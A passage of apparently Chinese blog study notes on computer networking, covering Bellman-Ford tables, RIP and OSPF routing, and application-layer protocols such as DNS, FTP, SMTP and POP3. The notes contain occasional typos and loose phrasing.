<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>{1, 2, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>5</td>
<td>{1, 2, 3, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>6</td>
<td>{1, 2, 3, 4, 5, 6}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody></table>
<h5 id="bellmanford"><a href="#bellmanford" class="headerlink" title="bellmanford"></a>bellmanford</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
<p>$L_h(i)$从源点到i点,最多经过h条链路时,最小链路代价和</p>
<p>计算过程</p>
<table>
<thead>
<tr>
<th><em>h</em></th>
<th>$L_h(2)$</th>
<th>Path</th>
<th>$L_h(3)$</th>
<th>Path</th>
<th>$L_h(4)$</th>
<th>Path</th>
<th>$L_h(5)$</th>
<th>Path</th>
<th>$L_h(6)$</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>10</td>
<td>1-3-6</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>4</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody></table>
<h4 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h4><p>动态路由协议的目的:</p>
<p>知道有哪些邻居路由器；</p>
<p>能够学习到网络中有哪些网段；</p>
<p>能够学习到至某个网段的所有路径；</p>
<p>能够从众多的路径中选择最佳的路径；</p>
<p>能够维护和更新路由信息。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110756904.png" alt="image-20221114110756904"></p>
<h5 id="自治系统"><a href="#自治系统" class="headerlink" title="自治系统"></a>自治系统</h5><p>每个自治系统内部使用一套相同的路由协议,同级的自治系统使用同一套路由协议,自治系统可以嵌套自治系统</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212170909097.png" alt="image-20230212170909097"></p>
<p>每个自治系统都要分配一个AS号,用于路由</p>
<p>本级自治系统只负责将本级的IP分组发往本级目标自治系统,剩下具体发往目标AS中的哪一台主机,<strong>由该AS内部的路由协议自己决定</strong></p>
<h5 id="RIP-on-距离向量算法"><a href="#RIP-on-距离向量算法" class="headerlink" title="RIP on 距离向量算法"></a>RIP on 距离向量算法</h5><p>RIP协议基于距离向量协议</p>
<p>RIP协议中的距离或者说代价,就是跳数</p>
<p>Distance vector,距离向量算法</p>
<p>每个节点都有一个</p>
<h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110945325.png" alt="image-20221114110945325"></p>
<p>最初的拓扑中,每个路由器都只知道与自己直连的路由器.其路由表中只有这些路由器的信息</p>
<p>比如D实际上式不知道B的存在的,它只知道A的存在.上图中的D的路由表中画出 BCE,但是距离是$\infin$,就相当于不知道它的存在</p>
<h6 id="共享路由信息-距离向量更新"><a href="#共享路由信息-距离向量更新" class="headerlink" title="共享路由信息&amp;距离向量更新"></a>共享路由信息&amp;距离向量更新</h6><p>周期共享</p>
<p>每个结点都会将自己知道的所有都告诉邻居</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111341938.png" alt="image-20221114111341938"></p>
<p>这里C共享给A的所有信息都要代价+2,这是AC之间的边权</p>
<p>C发往A的所有信息,其Next都是C,意思是,如果A需要使用该表中的一些信息,一定是C的贡献,届时A会以C作为下一跳发送相应数据包</p>
<p>A的老路由表和加上AC边权代价之后的C共享表进行比较,每一条路由都取Cost最小值,得到新路由表</p>
<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点:"></a>缺点:</h6><p>两个节点的不稳定性</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111751153.png" alt="image-20221114111751153"></p>
<p>当A与X之间的链路断开后,A到X的距离成为无穷大,如果因为丢包等原因,A没有及时通知B,X已经断开了,那么B就一直认为B-&gt;A-&gt;X这条链路正常.当B给A交换路由信息的时候,A又认为B还有其他通路到X(实际上就是之前的链路).于是A有到X的包就会发往B,B又发往A,A又发往B…</p>
<p>三个节点的不确定性:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212172241217.png" alt="image-20230212172241217"></p>
<p>X已经不和ABC连接了,A一开始也是知道X已经离开的,但是经过共享后,ABC都糊涂了</p>
<h6 id="基于距离向量的RIP协议"><a href="#基于距离向量的RIP协议" class="headerlink" title="基于距离向量的RIP协议"></a>基于距离向量的RIP协议</h6><p>就是将链路代价换成跳数</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212173742433.png" alt="image-20230212173742433"></p>
<h5 id="OSPF-on-链路状态路由选择算法"><a href="#OSPF-on-链路状态路由选择算法" class="headerlink" title="OSPF on 链路状态路由选择算法"></a>OSPF on 链路状态路由选择算法</h5><p>链路状态:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182013525.png" alt="image-20230212182013525"></p>
<p>每个节点都知道一些链路信息,比如链路代价,连接状态</p>
<p>每个节点都会字节建立一张路由表,通过洪范向其他节点广播状态</p>
<p>每个节点自己构建一个最短路径树,并以此构建路由表</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182406755.png" alt="image-20230212182406755"></p>
<p>最短路径树:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182518356.png" alt="image-20230212182518356"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E5%BA%94%E7%94%A8%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E5%BA%94%E7%94%A8%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-应用层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 18:28:00 / Modified: 18:29:11" itemprop="dateCreated datePublished" datetime="2023-02-12T18:28:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>[TOC]</p>
<h2 id="应用层概览"><a href="#应用层概览" class="headerlink" title="应用层概览:"></a>应用层概览:</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/3b83510e49c73908a1d9433b7e14bccc.png" alt="image-20220115220640203"></p>
<p><strong>熟知端口号:应用层协议在服务端的&#x3D;&#x3D;默认&#x3D;&#x3D;端口号,客户端端口号随意</strong></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8cbd969af94815b2a77969b48c049707.png"></p>
<h2 id="网络应用模型"><a href="#网络应用模型" class="headerlink" title="网络应用模型"></a>网络应用模型</h2><h3 id="客户-服务器模型"><a href="#客户-服务器模型" class="headerlink" title="客户&#x2F;服务器模型"></a>客户&#x2F;服务器模型</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/32549a6e2bec5e8e8adbb7c6c645d055.png" alt="image-20220115215144534"></p>
<h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程:"></a>工作流程:</h4><p>1.服务器处于接收请求的状态</p>
<p>2.客户机发出服务请求,等待接收结果</p>
<p>3.服务器收到请求后分析请求,进行必要的处理,返回给客户端</p>
<p>客户端必须事先直到服务端的IP地址,这通过DNS解析完成</p>
<p>服务端处于被动状态,谁来了给谁服务,不来的不管</p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h4><p>1.计算机第位不对等,服务器可以限制用户权限,比如ftp协议中ftp服务器可以设置管理员Administrator拥有读写的权力,但是匿名用户只有读的权力</p>
<p>2.客户机之间不直接通信</p>
<p>3.可拓展性差,服务器性能决定一切,服务器能力有限,想要服务更多的用户需要更强的服务器</p>
<h3 id="P2P模型"><a href="#P2P模型" class="headerlink" title="P2P模型"></a>P2P模型</h3><p>peer to peer </p>
<p>这个2的英语是two与to同音</p>
<p>(曾经)比较流行的p2p应用有 电驴 等等</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9781d4260d4e18bd79619b14134d7389.png" alt="image-20220115215157997"></p>
<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>1.计算机第位对等,任意一对计算机可以直接通信,减轻了服务器的压力,提高了效率和资源利用率</p>
<blockquote>
<p>P2P模型实质上依然是C&#x2F;S方式,A与B通信时A发送消息,B接收消息,A就是客户端,B就是服务端.</p>
<p>只不过没有了专门的服务器一说</p>
</blockquote>
<p>2.可拓展性好</p>
<p>3.网络健壮性强,单个节点失效一般不会影响其他部分</p>
<p>4.拥塞网络等缺点导致目前ISP(Internet Server Provider互联网服务供应商)对P2P模式持反对态度</p>
<h2 id="域名系统-DNS"><a href="#域名系统-DNS" class="headerlink" title="域名系统(DNS)"></a>域名系统(DNS)</h2><p>domain name system</p>
<p>采用客户&#x2F;服务器模型,协议运行在UDP之上,采用53号端口</p>
<h3 id="层次域名空间"><a href="#层次域名空间" class="headerlink" title="层次域名空间"></a>层次域名空间</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/0523696b731624567596ee5ee0e43614.png"></p>
<blockquote>
<p>域名命名规则</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5c5251f0e93aaed372842f55a4ccd2ba.png"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/682ab6339aec5c26d7dff29abc2e0285.png"></p>
<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>域名系统实际上是一个联机分布的数据库系统,采用C&#x2F;S模型</p>
<p>域名到IP地址的解析实在域名服务器完成的</p>
<p>一个域名服务器所管辖的域名范围称为区,同一个区中的各个节点一定联通</p>
<p>每个区设置相应的权限域名服务器,保存该区中所有计算机域名到IP地址的映射</p>
<p>每个域名服务器还应当有连向其他域名服务器的信息,当某个域名不在自己的管辖范围内时本域名服务器应当知道去哪里解析</p>
<h3 id="域名服务器的组织方式"><a href="#域名服务器的组织方式" class="headerlink" title="域名服务器的组织方式"></a>域名服务器的组织方式</h3><p>域名服务器以层次方式组织</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8c08cd3b1c1fbb14a0ab547cb765e8fb.png"></p>
<h4 id="根域名服务器"><a href="#根域名服务器" class="headerlink" title="根域名服务器"></a>根域名服务器</h4><p>最高层次的域名服务器,根域名服务器知道所有顶级域名服务器的IP地址</p>
<p>当本地域名服务器无法解析时首先询问根域名服务器</p>
<p>根域名服务器告诉本地域名服务器下一步应当找哪一个顶级域名服务器进行查询</p>
<h4 id="顶级域名服务器"><a href="#顶级域名服务器" class="headerlink" title="顶级域名服务器"></a>顶级域名服务器</h4><p>管辖在该顶级域名服务器下注册的所有二级域名</p>
<p>当收到其他服务器的DNS查询请求时返回当前域名或者下一级域名服务器的IP地址</p>
<h4 id="授权域名服务器"><a href="#授权域名服务器" class="headerlink" title="授权域名服务器"></a>授权域名服务器</h4><p>&#x3D;&#x3D;每台主机&#x3D;&#x3D;都必须在授权域名服务器处登记</p>
<p>为了可靠性,一台主机最好有两个以上的授权域名服务器(类似于留多个联系方式,方便找你)</p>
<p>许多域名服务器同时充当本地域名服务器和授权域名服务器</p>
<blockquote>
<p>这句话我的理解是&#x3D;&#x3D;路由器&#x3D;&#x3D;</p>
<p>即充当本地主机向外网发起DNS查询请求的本地域名服务器的功能,</p>
<p>又起到了外网查询本机IP的授权域名服务器的功能</p>
</blockquote>
<h4 id="本地域名服务器"><a href="#本地域名服务器" class="headerlink" title="本地域名服务器"></a>本地域名服务器</h4><blockquote>
<p>个人感觉类似局域网的域名服务器</p>
</blockquote>
<p>任何主机发出DNS查询请求时都需要首先送到本地域名服务器</p>
<p>本地链接填写的IP地址就是本地域名服务器地址</p>
<p>本地域名服务器记录根域名服务器的地址</p>
<h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>域名解析是把域名映射为IP地址或者把IP地址映射为域名的过程.</p>
<p>当客户端需要域名解析时,本地DNS客户端构造一个DNS请求报文以UDP数据包方式发往本地域名服务器</p>
<p>正向解析:域名映射为IP地址</p>
<p>反向解析:IP地址映射为域名</p>
<p>解析方式有两种:递归查询和递归与迭代相结合的查询</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8c026d23dfadc4803f73767aead7b400.png"></p>
<h4 id="递归解析过程解析y-abc-com的IP地址"><a href="#递归解析过程解析y-abc-com的IP地址" class="headerlink" title="递归解析过程解析y.abc.com的IP地址"></a>递归解析过程解析y.abc.com的IP地址</h4><p>1.主机首先查询本机的高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给本地域名服务器.</p>
<p>2.本地域名服务器首先检查高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给根域名服务器</p>
<p>3.根域名服务器首先检查高速缓存,没有找到y.abc.com的查询记录,于是将DNS解析请求报文发送给.com顶级域名服务器</p>
<p>4..com顶级域名服务器高速缓存也没有,于是将DNS解析请求报文发送给.abc.com权限域名服务器</p>
<p>5..abc.com权限域名服务器下恰好有一个注册域名为y.abc.com的主机,于是返回该主机的IP地址给上级.com顶级域名服务器</p>
<p>6..com顶级域名服务器收到.abc.com权限域名服务器的返回IP之后将该IP再返回给根域名服务器,同时在高速缓存中记录该查询记录,方便下次查询时避免递归</p>
<p>7.根域名服务器将.com返回的IP地址再返回给本地域名服务器,同时在高速缓存中记录该查询</p>
<p>8.本地域名服务器收到根域名服务器返回的IP地址,将该IP地址返回给发起请求的主机,并在高速缓存中记录该查询</p>
<p>9.发起请求的主机最终得到了y.abc.com的IP地址,并在本机的高速缓存中记录该查询</p>
<blockquote>
<p>高速缓存的作用?</p>
<p>如果主机刚才已经查询过y.abc.com的IP地址并且存储于高速缓存中,那么&#x3D;&#x3D;不久后&#x3D;&#x3D;的再次查询就可以直接从高速缓存中取记录,而不用再递归一大圈去找这个IP地址</p>
<p>为什么每一级服务器都需要高速缓存?</p>
<p>类似于记忆化搜索,本地域名服务器不一定只服务于一台主机,如果主机A,B都由本地域名服务器S提供服务,假设A解析了主机C,S会将C的IP地址存在高速缓存中,那么当B也需要查询C时本地域名服务器只需要返回刚才的记录</p>
</blockquote>
<p>缺点:</p>
<p>不考虑高速缓存的作用,每一次跨本地域名服务器的DNS查询都需要根域名服务器的介入,而世界上只有13台根服务器,但是却要面对上亿的主机和查询,根服务器将会不堪重负</p>
<p>改进方法:递归+迭代</p>
<h4 id="递归与迭代相结合的解析过程解析y-abc-com的IP地址"><a href="#递归与迭代相结合的解析过程解析y-abc-com的IP地址" class="headerlink" title="递归与迭代相结合的解析过程解析y.abc.com的IP地址"></a>递归与迭代相结合的解析过程解析y.abc.com的IP地址</h4><p>本地主机还是以解析y.abc.com的IP地址为例子,假设路径上服务器的高速缓存都没有存储该查询记录</p>
<p>1.本机向本地域名服务器发起DNS查询报文</p>
<p>2.本地域名服务器发现该DNS不在局域网内,需要向外网寻找,于是直接向根域名服务器发出请求</p>
<p>3.根服务器返回.com顶级服务器的IP地址</p>
<p>4.本地域名服务器收到.com的IP地址后向该.com顶级域名服务器发送请求</p>
<p>5..com顶级域名服务器返回.abc.com授权域名服务器地址</p>
<p>6.本地域名服务器收到.abc.com的IP地址后向该授权域名服务器发送请求</p>
<p>7..abc.com授权域名服务器返回y.abc.com的IP地址</p>
<p>8.本地域名服务器已经获得了y.abc.com的IP地址”我滴任务完成辣!啊哈哈哈哈”,然后将该IP地址返回给发起请求的本机</p>
<p>相对于递归方式,递归+迭代的方式中,根服务器,顶级域名服务器等被询问的服务器都没法在高速缓存上记录这次查询,因为他们都是的&#x3D;&#x3D;指路人&#x3D;&#x3D;而不是&#x3D;&#x3D;带路人&#x3D;&#x3D;的作用.</p>
<h2 id="文本传输协议FTP"><a href="#文本传输协议FTP" class="headerlink" title="文本传输协议FTP"></a>文本传输协议FTP</h2><p>File Transfer Protocol,因特网上使用最广泛的文件传输协议</p>
<p>功能:</p>
<p>1.兼容:不同种类(包括硬件软件)主机系统之间传输文件</p>
<p>2.权限:以用户权限管理的方式提供用户对远程FTP服务器上的文件管理能力</p>
<p>3.匿名共享:匿名FTP方式提供公用文件共享的negligence</p>
<h3 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a>FTP工作原理</h3><p>采用C&#x2F;S工作方式,使用TCP可靠的传输服务.</p>
<p>一个FTP服务器进程可以同时为多个客户进程提供服务(分时系统?)</p>
<p>FTP服务器进程分两大部分:</p>
<p>主进程:接受新的请求,处于一直监听的状态,只要有新的进程就立刻开一个从属进程来啊处理该请求</p>
<p>从属进程:处理单个请求</p>
<p>以主机A下载<code>ftp://ftp.abc.edu.cn/file</code>为例子描述工作过程</p>
<p>1.服务端开放21号端口,并监听这个端口,等待客户连接.</p>
<p>2.客户端开放随意端口连接到服务端的21号端口,建立控制连接</p>
<p>3.客户端通过控制连接发送下载文件的请求</p>
<blockquote>
<p>控制信息时7位ASCII码格式</p>
<p>控制连接只用来控制,不用来传输</p>
<p>数据连接和控制连接并行,即使是传输过程中也可以通过控制连接发送停止请求中止数据传输</p>
</blockquote>
<p>4.服务端接收到文件传输请求后,创建”数据传输进程”和”数据连接”,在20号端口与客户端的任意端口(区别于客户端刚才开放的控制连接端口)建立数据连接并且传输客户端请求的文件</p>
<p>5.当客户端的一次数据传输请求被满足时,服务端立刻关闭20端口,断开数据连接.控制连接继续接收用户的传输请求</p>
<h3 id="FTP服务特点"><a href="#FTP服务特点" class="headerlink" title="FTP服务特点:"></a>FTP服务特点:</h3><p>1.提供不同种类的主机系统之间的文件传输能力</p>
<p>2.以用户权限管理的方式提供用户对远程FTP服务器上的文件的管理能力</p>
<p>3.以匿名FTP方式提供公用文件共享的能力.匿名用户只能从FTP服务器拷贝文件,不能上传或者修改文件,即只读模式</p>
<p>4.使用TCP协议.</p>
<p>5.一个FTP服务器进程可以同时为多个客户进程提供服务</p>
<p>6.带外传送,使用两种连接,控制连接和数据连接.分别占用21和20端口,其中数据连接传送完毕之后立刻断开,控制连接一直持续</p>
<p>7.服务器必须追踪用户在远程目录树上的当前位置</p>
<h2 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h2><h3 id="组成结构"><a href="#组成结构" class="headerlink" title="组成结构"></a>组成结构</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/ac055e43baff6eafbde1f574ff0b617f.png"></p>
<p>异步通信方式,通信时双方都不需要在场</p>
<p>发送和接收实际是由邮件服务器完成的</p>
<p>用户的工作是通过用户代理命令邮件服务器完成工作</p>
<h4 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理:"></a>用户代理:</h4><p>User Agent</p>
<p><strong>“用户与电子邮件系统的接口”</strong></p>
<p>说人话就是电子邮箱,比如qq邮箱.</p>
<blockquote>
<p>用户发送邮件时在网络上的形象</p>
<p>人类在工作时的形象是工人,人类在教书时的形象是老师,人类在发送邮件时的形象是邮箱</p>
</blockquote>
<p>显然这个用户代理能够实现人类希望的,最起码的写信,显示,处理信的功能</p>
<h4 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h4><blockquote>
<p>电子邮件系统中的工具人儿,是用户代理的奴仆</p>
</blockquote>
<p>作用是:</p>
<p>1.收发邮件</p>
<p>2.向用户代理报告邮件传送情况</p>
<p>采用C&#x2F;S方式工作</p>
<p>一个邮件服务器本身是双料高级特工,在它&#x3D;&#x3D;发送邮件时他是客户端C,&#x3D;&#x3D;在它&#x3D;&#x3D;接收邮件的时候,它是服务端S&#x3D;&#x3D;</p>
<blockquote>
<p>用实际生活中收发邮件做一个类比</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/082dfb6a4adc8633ff832af17b26042c.png"></p>
<p>实际生活中接收邮件是比较类似于网上这一套的,每天早上我们起床之后出门检查一下私人邮箱里面是否有东西,从家里走出来到邮箱取邮件这一段是我们亲历亲为的,没法生动地解释用户代理这个概念</p>
<p>并且对于发送邮件,实际生活中我们需要跑好远到邮局或者偶遇邮递员送信,但是网络上我们却用的与收信相同的邮箱.这是天壤之别.</p>
<p>为了方便理解这件事,我们虚构一个”现实”:</p>
<p>1.我家有矿,收发邮件这种琐事怎么可能由我自己跑腿?雇一个管家专门代替我从屋门到邮箱这两三步的距离.</p>
<p>并且我不识字儿,写信也是我口述,管家代笔,我说错了要改,管家也不会烦,无条件服从我的命令.</p>
<p>收信我也不自己看,管家念给我听.</p>
<p>附近邻居家的情况与我相同</p>
<p>这个管家就比较类似与用户代理了</p>
<p>2.邮箱是&#x3D;&#x3D;公共的&#x3D;&#x3D;,并且这个邮箱好大,为每个用户都留了存放信件的地方,周围的邻居收发信件都通过这个邮箱,</p>
<p>每个邮箱都是邮局的功能,我发邮件不需要到邮局发,我只需要让管家写好信放在邮箱里.</p>
<p>每隔一段时间邮箱就会自己检查有没有待发送的邮件,</p>
<p>如果有,则召唤邮递员,让邮递员先不送信,屁颠屁颠地跑到目的地看看沿路能不能通,对方的邮箱能不能接收邮件</p>
<p>邮递员逛一圈回来报告都没有问题,邮箱就让邮递员正式送信</p>
<p>邮递员不管送信成功失败都会回来报告给邮箱,并且说明原因</p>
<p>3.邮箱有关于我的消息,比如新的邮件到达或者我发送的邮件成功或者失败等,&#x3D;&#x3D;不会提醒我&#x3D;&#x3D;.</p>
<p>只有当我想要了解邮箱有关我的状态时才会吩咐&#x3D;&#x3D;管家&#x3D;&#x3D;去邮箱看看&#x3D;&#x3D;我的那一部分&#x3D;&#x3D;,回来把消息说给我</p>
<p>这个邮箱就比较类似于邮件服务器了</p>
</blockquote>
<p><strong>记发送端邮件服务器为”客户端”</strong></p>
<p><strong>记接收端邮件服务器为”服务端”</strong></p>
<p>&#x3D;&#x3D;这两句很重要&#x3D;&#x3D;</p>
<h4 id="邮件发送协议SMTP"><a href="#邮件发送协议SMTP" class="headerlink" title="邮件发送协议SMTP"></a>邮件发送协议SMTP</h4><p>Simple Mail Transfer Protocol简单邮件传输协议</p>
<p>使用C&#x2F;S方式,发送方为客户端,接收方为服务端.</p>
<p>使用TCP连接,接收方服务器开放端口号25</p>
<blockquote>
<p>浏览器与基于万维网的邮件服务器(Gmail等)之间的邮件发送使用的是HTTP,相同的邮件服务器之间也是HTTP</p>
<p>只有不同邮件服务器之间传送邮件的时候才使用SMTP协议</p>
</blockquote>
<h5 id="多用途国际邮件扩充-MIME"><a href="#多用途国际邮件扩充-MIME" class="headerlink" title="多用途国际邮件扩充(MIME)"></a>多用途国际邮件扩充(MIME)</h5><p>SMTP只能传送ASCII码,无法实现”添加附件”的功能,于是就有了MIME(Multipurpose Internet Mail Extensions)</p>
<p>MIME是基于SMTP的,本质上是将用户要发送的”附件”转化为7位ASCII码然后套用SMTP协议,接收方再将ASCII码翻译过来</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/dbf93412a69704437e261e04cbc7f9e9.png"></p>
<p>MIME主要包括:</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5e9e57fdd27d2dd2d0a8cb6820567b4c.png"></p>
<p><strong>“推”</strong></p>
<p>推的意思是发送方主动,接收方被动</p>
<p>用户代理向&#x3D;&#x3D;客户端&#x3D;&#x3D;发送邮件采用的是SMTP协议</p>
<p>客户端向服务端发送邮件采用的也是SMTP协议</p>
<h4 id="邮件读取协议POP3"><a href="#邮件读取协议POP3" class="headerlink" title="邮件读取协议POP3"></a>邮件读取协议POP3</h4><p>post office protocol邮局协议,邮件读取协议</p>
<p>3是指第三个版本</p>
<p>使用C&#x2F;S方式,使用TCP连接,端口号110</p>
<p>拉的意思是发送方被动,接收方主动</p>
<p><strong>“拉”</strong></p>
<h3 id="邮件发送过程"><a href="#邮件发送过程" class="headerlink" title="邮件发送过程:"></a>邮件发送过程:</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/82a80e4ad4965a681ce5d1f29bce204d.png"></p>
<p>1.用户通过用户代理写好信之后使用SMTP协议将邮件发送给&#x3D;&#x3D;发送端邮件服务器&#x3D;&#x3D;(后面称为&#x3D;&#x3D;客户端&#x3D;&#x3D;),客户端将该邮件放入自己的邮件缓存队列中等待发送</p>
<p>2.客户端定时检查邮件缓存队列,如果有邮件待发送,则向&#x3D;&#x3D;接收端邮件服务器&#x3D;&#x3D;(后面称&#x3D;&#x3D;服务端&#x3D;&#x3D;)发送TCP连接请求</p>
<p>3.TCP连接建立后SMTP客户端向SMTP服务端发送邮件,当SMTP客户端邮件缓存队列清空时,SMTP关闭TCP连接</p>
<p>4.服务端接收到邮件之后将邮件放入用户信箱</p>
<p>5.收信用户打算收信时,让用户代理去邮件服务器的用户信箱拉取邮件</p>
<h3 id="电子邮件格式"><a href="#电子邮件格式" class="headerlink" title="电子邮件格式"></a>电子邮件格式</h3><p>$$<br>电子邮件<br>    \begin{cases}<br>        信封\<br>        内容<br>            \begin{cases}<br>                首部\<br>                主体<br>            \end{cases}<br>    \end{cases}<br>$$</p>
<p>信封完全不用用户操心,信封是从信的内容首部提取信息填写的</p>
<h4 id="内容首部"><a href="#内容首部" class="headerlink" title="内容首部"></a>内容首部</h4><p>首部由首部行组成</p>
<p>首部行的格式是:<code>键:值</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5b04141ab6b1e30c79cda318b2348026.png"></p>
<p>发件人地址From,收件人地址To等是必须内容</p>
<p>主题Subject等是非必须内容</p>
<p>其中收件人地址,主题这种信息由用户手动填写,发件人地址和发件时间自动填写</p>
<blockquote>
<p>From和To都是用户地址</p>
<p><a href="mailto:&#104;&#111;&#111;&#x70;&#100;&#x6f;&#103;&#x40;&#104;&#117;&#115;&#x74;&#46;&#x65;&#x64;&#x75;&#46;&#99;&#x6e;">&#104;&#111;&#111;&#x70;&#100;&#x6f;&#103;&#x40;&#104;&#117;&#115;&#x74;&#46;&#x65;&#x64;&#x75;&#46;&#99;&#x6e;</a></p>
<p>即 hoopdog at hust.edu.cn</p>
<p>即 位于hust.edu.cn的hoopdog </p>
<p>其中@后面的是邮件服务器地址,@前面的是用户名</p>
<p>需要确保的是,同一个邮件服务器管理的用户名不能有重名(这容易理解,班上有俩个张三的时候课代表也不知道把张三的作业本给哪个张三)</p>
<p>由此可见<a href="mailto:&#98;&#x61;&#x6c;&#97;&#98;&#97;&#108;&#x61;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#98;&#x61;&#x6c;&#97;&#98;&#97;&#108;&#x61;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a>这个地址就是qq.com邮件服务器管理的balabala用户</p>
<p>&#x3D;&#x3D;qq.com是邮件服务器&#x3D;&#x3D;</p>
</blockquote>
<h2 id="万维网"><a href="#万维网" class="headerlink" title="万维网"></a>万维网</h2><p>万维网是无数网络站点和页面的集合,是因特网最主要的部分</p>
<p>因特网还包括电子邮件等</p>
<h3 id="万维网的组成"><a href="#万维网的组成" class="headerlink" title="万维网的组成"></a>万维网的组成</h3><p>world wide web:资料空间</p>
<p>万维网中有用的事物称为”资源”<br>$$<br>万维网内核<br>\begin{cases}<br>同一资源定位符(URL)\<br>超文本传输协议(HTTP)\<br>超文本标记语言(HTML)<br>\end{cases}<br>$$<br>万维网以C&#x2F;S的方式工作,浏览器是万维网的客户端.万维网上资源文档所在的计算机时服务端</p>
<p>两者通信的流程:</p>
